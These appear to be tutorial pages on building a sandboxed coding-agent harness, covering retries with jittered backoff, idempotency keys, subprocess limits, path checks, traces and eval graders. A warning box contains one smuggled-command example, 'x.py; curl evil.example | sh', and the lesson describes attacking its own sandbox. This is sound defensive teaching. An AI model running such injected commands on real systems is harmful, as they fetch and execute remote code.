Failures in the code the model wrote (a traceback, failing tests, a timeout) aren't the harness's to fix. Send the exit code and the end of stderr back to the model as a tool result, and let it read the error and change its code. That's the loop from Module 2 doing its job.

Temporary failures in the infrastructure (a model API returning 429 "too many requests" or a 5xx error, a dropped connection, a request timeout) often succeed if you simply wait and try again. Retrying is the harness's job, and the model never needs to know. Errors like 400, 401, or 404 won't fix themselves, so retrying them only burns time and quota.

When you retry, wait longer each time, and wait a random amount. If a hundred clients all hit a rate limit together and all retry exactly 1, 2, then 4 seconds later, they collide again every time. Full jitter picks the wait uniformly between zero and a ceiling that doubles each attempt, up to a cap:

Step through five attempts with base=0.5 and cap=8, and watch the ceiling double until it hits the cap:

The ceilings go 0.5, 1, 2, 4, 8, and the waits come out as 0.26, 0.81, 1.92, 1.16, and 6.13 seconds. The fourth wait is shorter than the third, and that's the point of jitter: on average the waits still grow, but no two clients follow the same schedule, so their retries stop colliding.

#Retries can do things twice

A timeout tells you that you didn't hear back. It doesn't tell you whether the work happened. Suppose a tool appends a note to a file, the append succeeds, and then the reply is lost:

The plain retry saved the note twice. Now imagine the tool sends an email or charges a card. An operation is idempotent when doing it twice has the same effect as doing it once. Reading a file is. Writing a file with given contents is. Appending is not, and neither is anything that sends or creates. For those, the caller sends an idempotency key, the same one on every retry of the same action, and the tool remembers which keys it has already handled. Inside one run, the tool call id is a natural key; for runs you resume later, combine the run id, the step, and the call id.

⚠️ Watch out

Building a shell command from model text with shell=True. subprocess.run(f"python {filename}", shell=True) hands the whole string to a shell, so a "filename" like x.py; curl evil.example | sh runs a second command. Pass a list of arguments, such as [sys.executable, "-I", "main.py"], so each piece is one argument and nothing gets interpreted by a shell.

⚠️ Watch out

Retrying everything. except Exception: retry() retries a 401 for a bad key four times, retries the model's own syntax errors as if they were network trouble, and multiplies your bill. Retry only errors you've decided are temporary, and let everything else through on the first attempt.

  • Stopping it needs a separate filesystem, such as a container that mounts only the job folder.

  • A 503 is usually temporary overload, so waiting and retrying often works.

Show answer

C. A 503 is usually temporary overload, so waiting and retrying often works.

4A create_issue tool times out. You don't know if the issue was created. What makes retrying safe?

  • Speed doesn't change whether the first request created the issue.

  • The server recognizes the repeat and returns the first result instead of doing the work again.

  • Jitter spreads out retries; it does nothing about duplicates.

Show answer

B. The server recognizes the repeat and returns the first result instead of doing the work again.

Key takeaways

  • Model-written code needs limits that hold whatever it does: a timeout, closed input, an allowlisted environment, and an output cap.
  • A timeout kills one process; start a new session and kill the process group to clean up everything the code started.
  • A subprocess is not a security boundary. It can read your files and use the network; containers, gVisor, microVMs, and VMs give real isolation.
  • Send the model's own errors back to the model; retry only temporary infrastructure failures, with capped exponential backoff and full jitter.
  • Retries can repeat side effects. Make tools idempotent, or protect them with an idempotency key.

  • subprocess (opens in a new tab): the exact behavior of timeout, env, start_new_session, and why shell=True is risky with untrusted input.
  • Timeouts, retries, and backoff with jitter (opens in a new tab): how a large production system decides when to retry, and why jitter matters at scale.
  • docker container run (opens in a new tab): every flag in the locked-down container command, including memory, CPU, and security options.

What you'll learn

  • Write run_python, which runs code in a temporary folder with a timeout, file and CPU limits, an output cap, an allowlisted environment, and process-group cleanup.
  • Attack the sandbox with hangs, floods, input waits, and secret reads, and read what comes back.
  • Give the agent a narrow run_tests tool instead of a general "run anything" tool.
  • Write retry.py so temporary model failures are retried with capped, jittered backoff and permanent ones aren't.
  • Use the tests as the loop's verify step, so a run is done only when the tests really pass.

In Module 2, verify checked whether calc.py contained a + b, which a wrong fix could pass. This lesson replaces that with the real check: run the tests. Running code is what the sandbox is for, so you'll build it first, then attack it, then hand the agent a tool that uses it. Here's the path one piece of code takes through run_python:

New files this lesson:

#Step 1: Limits the child sets on itself

Some limits can't be set from outside a process; the process has to set them on itself. preexec_fn is a function that subprocess runs inside the child after it's created and before Python starts, which is the moment to set them. Here's the top of harness/sandbox.py:

RLIMIT_FSIZE caps the size of any file the child writes, at 1 MB by default. That includes the files its output goes to, which is how the output cap is enforced: past the limit, Python raises OSError instead of filling your disk. RLIMIT_CPU caps CPU seconds, a second line of defense behind the wall-clock timeout. Both soft and hard limits are set to the same value, and an unprivileged process can't raise its own hard limit, so the code can't undo them.

_head and _tail read at most limit bytes from the start or end of an output file. Normal output reads best from the start. Tracebacks and test summaries are at the end, so stderr keeps its tail.

📝 Note

Python's docs warn that preexec_fn isn't safe in a program that uses threads, because the child can deadlock before it starts. The harness is single-threaded. If yours grows threads, set the limits in a small wrapper script that the child runs first instead.

#Step 2: run_python

The rest of the file is one function:

The last line is only for this page. Things to notice:

  • Output goes to temporary files outside the job folder, not to pipes. A pipe fills up and blocks the child if nobody reads it, and the child can't overwrite a file it can't see.
  • The process group is killed on every exit, even a clean one, so a worker the code started in the background can't outlive the job.
  • HOME and TMPDIR point at the job folder, so code that writes to ~ or to the temp directory writes somewhere that gets deleted.
  • Temporary paths are stripped from stderr. File "main.py", line 1 is shorter and means more to the model than a full temp path. On macOS, the temp folder has two names (/var/... and /private/var/...), so the longer one is replaced first.
  • The result is a plain dictionary, so it can be a tool result and, in Module 4, a trace entry without any conversion.

#Step 3: Attack it

Here's hostile code, one line per attack. Before you run it, predict each row's exit and timed_out:

Read the rows:

  • The infinite loop hit the one-second limit and was killed. Exit code -9 means "killed by signal 9" (SIGKILL) on macOS and Linux.
  • input() failed instantly with EOFError, because stdin is closed, instead of hanging.
  • The flood stopped itself when its output file reached 1 MB. OSError: [Errno 27] File too large is the file-size limit, and truncated=True says the harness kept only part of the output.
  • The key printed None, because the child's environment never had it.
  • The crash came back as data: exit code 1 and the last line of the traceback, ready to show the model.

The sandbox has done its job when bad code turns into a row like these, never a frozen harness or a full disk. Reading your files and using the network still aren't blocked, as the Notes showed; for that, run the whole harness in a container.

You could register run_python as a tool and let the model run anything. It's better to give the model the narrowest tool that does the job. Here, the job is "run the project's tests," so that's the tool. It copies the workspace's top-level .py files into the sandbox and runs unittest discovery there. It starts with from harness.sandbox import run_python:

There's a subtlety in -I. Isolated mode leaves the job folder off sys.path, so a plain import calc from main.py would fail. unittest discovery adds the folder it searches to sys.path itself, which is why the tests can import calc anyway. Give it a buggy workspace:

Both tests failed, and the output says exactly how: -1 != 5 and 1 != -5. Those lines are filtered out of the full output here to keep the page short; the model gets all of it, up to the output cap.

#Step 5: Retry what's temporary

Model calls fail too: rate limits, overloaded servers, dropped connections. harness/retry.py retries those and lets everything else through on the first try. It needs no imports from the rest of the harness:

HTTPError is a subclass of URLError, so it's checked first. Otherwise a 401 would match the URLError line and be retried forever. Passing sleep and rng in makes the function testable: a test can record the waits instead of sleeping through them.

The final program uses the files from Modules 1 and 2. They're unchanged; skip past them if you have them open. First harness/model.py:

Then harness/tools.py:

Then harness/files.py:

And harness/loop.py:

run_fix_task.py gives the agent the file tools and run_tests, wraps the model in RetryingModel, and makes the tests the verify step. To exercise the retries offline, Overloaded makes the scripted model fail with a 503 on its first two calls, the way a busy provider might. The fifth scripted reply is a function: it reads the latest test result and decides what to do, like a model reading its own failure. It uses the workspace from Step 4, and on disk it also imports from harness.model, harness.tools, harness.files, harness.loop, harness.test_tool, harness.retry, and harness.chat_api.

Follow the run. The first test run failed both tests. The model's first fix, abs(a) + abs(b), passes add(2, 3) but not the negative case, and the second test run said so. The scripted function read that result and wrote the real fix. The final claim was then checked by verify, which ran the tests itself instead of trusting the model's word. Meanwhile two 503s were retried without the loop ever seeing them.

With --live, your real model gets the same tools and the same verification. Small local models often skip running the tests, and verify is what catches that.

Check your understanding

3 questions

1Why does the agent get run_tests instead of a general run_python tool?

  • Fewer capabilities mean fewer ways for a confused or manipulated model to do damage, and the sandbox still contains whatever the tests do.

  • It can; run_tests is built on it. The question is what the model should be allowed to ask for.

  • run_tests returns a dictionary too.

Show answer

A. Fewer capabilities mean fewer ways for a confused or manipulated model to do damage, and the sandbox still contains whatever the tests do.

2The model calls run_tests, sees passed: true, and says it's done. Why does verify run the tests again?

  • Speed has nothing to do with whether the claim is true.

  • The harness trusts only what it checked itself, at the moment it decides the run is done.

  • Rerunning only helps with flaky tests; here it's about who does the checking.

Show answer

B. The harness trusts only what it checked itself, at the moment it decides the run is done.

3Why does run_python keep the head of stdout but the tail of stderr?

  • Either can be longer; it depends on the code.

  • The last line of a traceback names the error, and FAILED (failures=2) comes at the very end.

Show answer

B. The last line of a traceback names the error, and FAILED (failures=2) comes at the very end.

Key takeaways

  • run_python runs code in a temporary folder with a timeout, file and CPU limits, closed input, an allowlisted environment, and process-group cleanup, and always returns the same dictionary.
  • Hostile code becomes a result row: killed at the timeout, EOFError on input, File too large on a flood, no secrets in the environment.
  • Give the model the narrowest tool that does the job; here, run_tests.
  • RetryingModel retries 408, 429, 5xx, and connection failures with jittered backoff, and passes everything else through on the first try.
  • Using the tests as verify means done requires passing tests, checked by the harness.

#Ideas to extend it

  • Add a max_memory option that sets RLIMIT_AS on Linux (macOS doesn't enforce it), and test it with code that builds a huge list.
  • Let run_tests take an optional pattern argument, such as test_calc.py, so the agent can run one file while it works and the whole suite at the end.
  • Write a run_in_container function with the same signature and return value as run_python that runs the Docker command from the Notes, and pick between them with a setting.

#Further reading

  • tempfile (opens in a new tab): TemporaryDirectory and TemporaryFile, and when they're cleaned up.
  • gVisor documentation (opens in a new tab): how a user-space kernel sandboxes containers, the next step up from a plain container.

What you'll learn

  • Honor a server's Retry-After header, and give up when it asks for too long.
  • Measure what full jitter does to the average and worst-case wait.
  • Write a path check that survives .., symlinks, absolute paths, and look-alike folder names.
  • Build a child environment from an allowlist, and refuse anything that looks like a secret.
  • Make a side-effecting tool run at most once per idempotency key, even after a restart.
  • Run a repair loop that feeds errors back to the model and stops after a fixed number of tries.

Each exercise is a small function you could drop into harness/retry.py, harness/sandbox.py, or harness/files.py. The solutions are standalone, so run each one in a scratch file before you peek.

#Warm-up: the worst case

with_retries uses attempts=4, base=0.5, and cap=8. What's the longest it can spend waiting before it gives up? What if you raise attempts to 8? Work it out, then check:

Four attempts means three waits, not four, because there's nothing to wait for after the last one. With full jitter each wait is somewhere between zero and its ceiling, so 3.5 seconds is the worst case. At eight attempts the cap kicks in and the worst case jumps to 31.5 seconds, which is a long time for a person staring at a terminal. More attempts isn't free.

#Exercise 1: Honor Retry-After

When a server sends a 429 or 503, it may include a Retry-After header saying how many seconds to wait. Write retry_delay(exc, attempt) that returns the number of seconds to wait, or None if the error shouldn't be retried at all. Use the header when it's a whole number of seconds, give up if it asks for more than longest (30 seconds), and fall back to full jitter otherwise.

Sample output:

Need a hint?

exc.headers.get("Retry-After") returns the header or None. Check the status code first: a 401 with a Retry-After header still shouldn't be retried.

Show solution

The server knows its own load better than your backoff formula does, so its number wins. Giving up on Retry-After: 300 is a deliberate choice: a harness that silently sleeps five minutes looks frozen, and it's better to stop and report. Retry-After can also be an HTTP date instead of seconds; this version treats anything that isn't digits as "no header," which is safe but could be smarter.

#Exercise 2: What full jitter does on average

Write schedule(attempts) that returns the list of waits for one retry sequence. Then generate 10,000 sequences for attempts=6 with a seeded random.Random, and for each wait report its ceiling, its mean, its maximum, and whether every value stayed between zero and the ceiling. Finish with the mean and worst total.

Sample output:

Need a hint?

statistics.mean and max over [run[n] for run in runs] give the numbers for wait n. The worst possible total is the sum of the ceilings.

Show solution

Each mean is half its ceiling, because a uniform pick between 0 and c averages c / 2. So full jitter waits about half as long as plain exponential backoff on average, while spreading clients across the whole range. The worst case seen in 10,000 runs, 14.66 seconds, never reaches the possible 15.5, but it gets close. Plan your timeouts around the possible worst case, not the average.

#Exercise 3: A path check with a classic bug

Here's a path check that looks reasonable: resolve the path, then check that the result starts with the workspace's path. Test it against a normal file, a .. escape into a folder called workspace-private, a symlink inside the workspace that points into workspace-private, and an absolute path. Then write safe_path that refuses all three escapes.

Sample output:

Need a hint?

Compare the strings /tmp/x/workspace and /tmp/x/workspace-private/keys.txt. Does the second start with the first? Now compare them as paths, part by part, which is what Path.is_relative_to does.

Show solution

realpath did follow the .. and the symlink correctly. The bug is the comparison: "/tmp/x/workspace-private/keys.txt".startswith("/tmp/x/workspace") is True, because string prefixes don't respect folder boundaries. is_relative_to compares whole path components, so workspace-private never matches workspace. This is the check harness/files.py uses. On Windows, creating symlinks may need Developer Mode or administrator rights, so this test may only run on macOS and Linux.

#Exercise 4: An allowlist with a guard

Write child_env(parent, allow, extra) that builds a child's environment from an allowlist of names plus extra values you set on purpose. Add a guard: if any resulting name contains KEY, TOKEN, SECRET, PASSWORD, or CREDENTIAL (in any case), raise ValueError instead of returning it. Prove it with a child process that prints the names it can see.

Sample output (Python on macOS adds a couple of LC_ and __CF variables of its own, which the probe hides):

Need a hint?

A dictionary comprehension builds the allowlisted part. A compiled regular expression with re.IGNORECASE makes the guard one line.

Show solution

The allowlist does the real work: GITHUB_TOKEN and LLM_API_KEY never got near the child because nobody listed them. The guard catches the other failure, a teammate adding a secret to allow to "make something work." Failing loudly is better than passing it through quietly. A name-based guard can't catch a secret stored under an innocent name like CONFIG, which is one more reason the allowlist should stay short.

#Exercise 5: Once per key, even after a crash

Write Once, a wrapper around a side-effecting function. Calling send(key, *args) runs the function only the first time it sees key and returns the saved result on later calls. Save the ledger to a JSON file after each new key, so a new Once created from the same file (a harness that crashed and resumed) still remembers.

Sample output:

Need a hint?

Load the ledger in __init__ if the file exists. In __call__, check the key first; otherwise run the function, store the result, write the file, and return.

Show solution

The keys combine the run, the step, and the tool call id, so a retry of the same call reuses its key and a different action gets a new one. There's still a gap: if the process dies after fn runs but before the ledger file is written, a resume will do it again. Closing that gap needs the effect and the record to be saved together, or a receiving service that deduplicates by key itself. Payment and messaging APIs that accept an idempotency key exist for exactly this reason.

#Exercise 6: A bounded repair loop

Write repair(attempts, check, max_tries=3). Each try, attempts(feedback) plays the model: it receives the last error line (or None the first time) and returns new code. Run the code plus the check assertions in a child process with a timeout, print one line per try, and return ("fixed", tries) or ("gave up", max_tries). Test it with a model that fixes its bugs one at a time, and with one that writes an infinite loop every time.

Sample output:

Need a hint?

Catch subprocess.TimeoutExpired and turn it into an error line like any other failure. The last line of stderr is usually the most useful single line of a traceback.

Show solution

The first model needed all three tries: a typo, then a crash on the empty list, then a correct version. Each error line pointed at the next fix, which is how real models use tracebacks. The stubborn model shows why max_tries exists. Three timeouts cost three seconds here; without a limit, they'd cost forever. This is the same shape as run_agent with verify, shrunk to a single tool.

#Challenge: Retries with a deadline

Retry counts don't map to wall-clock time, and the caller usually cares about time. Write with_deadline(fn, deadline, clock, rng) that retries fn on TimeoutError with full jitter, but refuses to start a wait that would end past the deadline, and raises a TimeoutError saying why. Use a fake clock with time() and sleep() so the test runs instantly, and make each failed call itself take 0.3 seconds of fake time.

Sample output:

Need a hint?

Compute the time left as deadline - (clock.time() - start) just before each wait, and compare it with the wait you're about to take. Raise with from exc so the original error stays attached.

Show solution

The first run gave up at 2.6 seconds instead of sleeping past the 5-second deadline, and its message says exactly why, which is what you'd want in a trace. Counting the time the calls themselves take (0.3 seconds each) matters: on a slow API, the calls can use more of the deadline than the waits. The fake clock is the reusable idea. Any code that sleeps or reads the time should take its clock as a parameter, so tests can run in microseconds and get the same result every time.

m4-l1.html:
What you'll learn

  • List the events a complete agent trace records, and the fields each needs for auditing and debugging.
  • Explain why JSON Lines survives crashes and grows well, where one big JSON file doesn't.
  • Replay a recorded run without a model, and use a divergence to find what changed.
  • Turn traces into eval cases with frozen inputs, explicit expectations, and a version fingerprint.
  • Choose between deterministic graders and a model-based judge, and spot a grader that passes wrong answers.

A run ends with status done and the answer "Fixed the bug; all tests pass." The tests don't pass. What happened?

Maybe the agent never ran the tests. Maybe it ran them, misread the output, and stopped. Maybe the tests passed, and then a later "tidying" edit broke the file again. Each of those needs a different fix (a better tool description, a verify step, a stop rule), and the final answer can't tell them apart. Only a record of every step can.

The same goes for scores. If "7 of 10 tasks" on Friday and "9 of 10" on Monday came from task files that someone edited in between, the two numbers measure different things. This module gives you two habits: record every observation and action as it happens, and freeze the tasks you grade against.

#What a trace records

A trace is the full, ordered record of one run: every model call, every tool call and its result, every verification, and how the run ended. It's written as events, one per thing that happened, and every event carries the run id, the step number, and its type:

Event Extra fields Answers the question
start task, model name, tool names, step limit What was the agent asked, with which setup?
model latency in ms, input and output tokens, content, tool calls What did the model decide, and what did it cost?
tool call id, tool, arguments, ok, result or error, latency What did the harness do, and what came back?
verify ok, the problem found Did the harness's own check agree with the model?
end status, final answer How did the run finish?

Here are the first lines of a trace from the next lesson (the latencies change slightly every run):

Two rules make a trace trustworthy. Record events as they happen, not as a summary at the end, because the runs you most need to understand are the ones that crashed before the end. And record what the model was shown and what it did, not your interpretation of it. "The agent seemed confused" isn't evidence; three identical read_file calls are.

#Why JSON Lines

JSON Lines (JSONL) puts one complete JSON object on each line of a file. The harness opens the file in append mode, writes a line, and moves on. Compare it with the obvious alternative, one JSON array written at the end, when the process dies partway through writing:

The array lost everything, because a JSON document is only valid once its closing ] is written. The JSONL file lost only the line being written. It has other advantages too: you can append without rewriting the file, read a huge trace one line at a time, grep it for "ok": false, and concatenate traces from many runs into one file.

Reading a trace is a loop over events. Step through this one and watch the counters change, then predict the three numbers it prints:

612 tokens, one tool error, three steps. Notice the input tokens grow each step (120, 190, 260): the history from Module 2, re-sent every call, is visible right there in the trace.

#Replay: rerun a recorded run for free

The model is the expensive, slow, random part of a run. A trace contains every reply it gave, so you can rerun the run with a replay model that returns those replies in order instead of calling anything. The tools still run for real. If the world hasn't changed, the replay matches the recording exactly. If it has, the first place they differ tells you what changed:

The divergence points straight at the changed file. Notice the replayed answer is still "June 3", now wrong, because a recording can't react to new information. Replay answers "what changed between these runs?" and "does my harness change alter behavior on recorded runs?" It doesn't answer "what would the model do now?" That still needs a live run.

Replay is also how you turn a surprising real run into a permanent test. A replayed trace is a script, so the bug you saw once with a real model becomes a ScriptedModel test that fails the same way every time until you fix it.

#From traces to eval cases

An eval case is one task frozen in place: the exact prompt, the exact starting files, and the checks that decide whether a run passed. Traces are where good cases come from. Read your traces and pick the failures, the near misses, and a few representative successes, then write down what a correct run must do.

The set of cases is a dataset, and it gets the same discipline as code. Save the cases in a stable order, and record a version: a hash of the file's exact bytes. Change one character and the version changes:

Every score you report carries the version it was measured on. Two scores are comparable only if their versions match. When a case needs fixing, don't edit it in place: write a new file (tasks-v2.jsonl), and rerun anything you want to compare against it.

#Graders: deterministic first, a judge when you must

A grader turns one run into pass or fail. Deterministic graders are code: the same run always gets the same grade, for free. They check things like whether the answer contains a phrase, whether the tests pass, whether a file has the right contents, which tools were called, and how many steps it took. Use them whenever the success condition can be written as code.

Deterministic doesn't mean correct, though. Here's the obvious check for "the answer says June 3," applied to four answers:

Plain in passes "June 30," which is wrong. A word-boundary regex fixes that, but both pass the last answer, which says the opposite. Test your graders on wrong answers, not just right ones. And when meaning matters more than wording, there are two good moves: ask the agent for a structured answer ({"deadline": "2026-06-03"}) that code can check exactly, or use a model.

A model-based grader, or judge, is a model call with a rubric: "Pass only if the answer states the deadline from the notes; fail if it hedges or contradicts them." Judges can grade explanations, summaries, and tone, which code can't. They also cost a model call per grade, can be wrong, and can be swayed by how an answer is written. Treat a judge as part of the eval set: version its prompt and model along with the cases, demand a strict JSON verdict, count a reply you can't parse as a grader error rather than a pass, and check its verdicts against a sample graded by people before you trust its numbers. Module 5 measures how judges fail.

⚠️ Watch out

Writing secrets into traces. A trace records every tool result, so if the agent prints the environment or reads a config file, your key is now in traces/. Redact known secret patterns in the tracer itself, before anything is written, and keep traces/ out of Git (Module 1's .gitignore already does).

⚠️ Watch out

Editing eval cases in place. Fixing a typo in a task's prompt changes the task. If you edit tasks-v1.jsonl and rerun, the new score and last week's aren't comparable, and nothing tells you so. Make a new version file, and print the version next to every score.

Check your understanding

4 questions

1The harness crashes halfway through run 37 of 50. Which trace format still lets you see what run 37 did up to the crash?

  • Every line written before the crash is a complete JSON object, so only the line in progress is lost.

  • The run never ended, so nothing was written.

  • That technically works, but rewriting the whole file each step gets slow, and a crash mid-rewrite can still corrupt it.

Show answer

A. Every line written before the crash is a complete JSON object, so only the line in progress is lost.

2You replay a trace from last week, and it diverges at step 2: read_file("config.json") returns different text. What have you learned?

  • A replay doesn't call the model at all; it returns the recorded replies.

  • Replay holds the model constant, so a divergence in a tool result points at the world, not the model.

  • Divergence is the information replay is designed to give you.

Show answer

B. Replay holds the model constant, so a divergence in a tool result points at the world, not the model.

3A grader checks "42" in answer. Which answer does it wrongly pass?

  • That one is right, and it passes.

  • It contains "42" twice and is still wrong. Test graders on near-miss wrong answers.

  • This is right but fails the check, which is the opposite mistake.

Show answer

B. It contains "42" twice and is still wrong. Test graders on near-miss wrong answers.

4Two scores are printed: "8/10 (tasks a3f1c09e27d4)" and "9/10 (tasks 5b8e2d4c1f07)". What can you conclude?

  • The versions differ, so the task sets differ.

  • The version hash exists so that you notice this before drawing a conclusion.

Show answer

B. The version hash exists so that you notice this before drawing a conclusion.

Key takeaways

  • A trace records every model call, tool call, verification, and ending as it happens, with tokens and latency.
  • JSON Lines survives crashes, appends cheaply, and is easy to stream and search.
  • Replay returns recorded model replies so a run reproduces for free; the first divergence shows what changed in the world.
  • Eval cases freeze the prompt, the starting files, and the checks; the dataset's hash goes next to every score.
  • Prefer deterministic graders and test them on wrong answers; use a versioned, strict judge only where code can't decide.

#Further reading

  • JSON Lines (opens in a new tab): the whole format on one page, including why each line must be one complete value.
  • OpenTelemetry semantic conventions for generative AI (opens in a new tab): the field names production tracing tools use for model calls, tokens, and tool calls, if you want your traces to match them.
  • Demystifying evals for AI agents (opens in a new tab): how to build agent eval tasks and graders, and what goes wrong with each.
